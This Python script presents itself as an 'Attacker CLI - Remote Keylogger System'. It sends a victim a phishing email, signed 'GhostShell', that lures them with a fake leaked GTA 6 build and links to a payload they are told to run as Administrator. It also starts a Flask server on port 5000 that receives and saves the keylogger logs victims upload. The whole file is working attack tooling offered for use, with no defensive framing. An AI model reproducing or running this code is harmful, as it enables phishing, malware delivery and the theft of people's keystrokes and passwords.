import os
import ssl
import smtplib
from flask import Flask, request
from threading import Thread
from datetime import datetime
from email.message import EmailMessage

# ===== Shared core logic =====

UPLOAD_FOLDER = os.path.join(os.getcwd(), "received_logs")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

app = Flask(__name__)

@app.route("/")
def index():
    return "Flask server running..."

@app.route("/upload", methods=["POST"])


def upload():
    if 'logfile' not in request.files:
        return "No file uploaded", 400

    uploaded_file = request.files['logfile']
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"log_{timestamp}.json"
    file_path = os.path.join(UPLOAD_FOLDER, filename)

    try:
        uploaded_file.save(file_path)
        print(f"[+] Log saved: {filename}")
        return "File uploaded", 200
    except Exception as e:
        print(f"[!] Error saving log: {e}")
        return f"Error: {e}", 500

def run_flask_server():
    app.run(host="0.0.0.0", port=5000)

def send_email(sender_email, app_password, receiver_email, subject, body):
    msg = EmailMessage()
    msg["Subject"] = subject
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg.set_content(body)

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as smtp:
        smtp.login(sender_email, app_password)
        smtp.send_message(msg)

def compose_email(github_link):
    subject = "🔥 GTA 6 Pre-Alpha Leak!"
    body = f"""
Hey there!

Here’s the leaked early access build of GTA 6! 😍
Click to download: {github_link}

First read the requirement.txt 😉
Run as Administrator for best performance.

- GhostShell 👻
"""
    return subject, body

def main():
    print("\n[*] Welcome to Attacker CLI - Remote Keylogger System")
    print("[*] Please enter the required details to compose and send a fake email.\n")

    sender_email = input("[?] Enter attacker Gmail address : ").strip()
    app_password = input("[?] Enter attacker 16-digit App Password : ").strip()
    victim_email = input("[?] Enter the victim's email address: ").strip()
    github_link = input("[?] Paste the direct GitHub raw link to your payload (e.g., https://raw.githubusercontent.com/...): ").strip()

    print("\n[*] Starting Flask server in the background on port 5000 to receive logs...\n")
    Thread(target=run_flask_server, daemon=True).start()

    subject, body = compose_email(github_link)

    try:
        send_email(sender_email, app_password, victim_email, subject, body)
        print(f"[+] Email successfully sent to: {victim_email}")
        print("[*] Waiting for logs... Press Ctrl+C to exit.")
    except Exception as e:
        print(f"[!] Failed to send email: {e}")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\n[!] Exiting . Goodbye!")

if __name__ == "__main__":
    main()
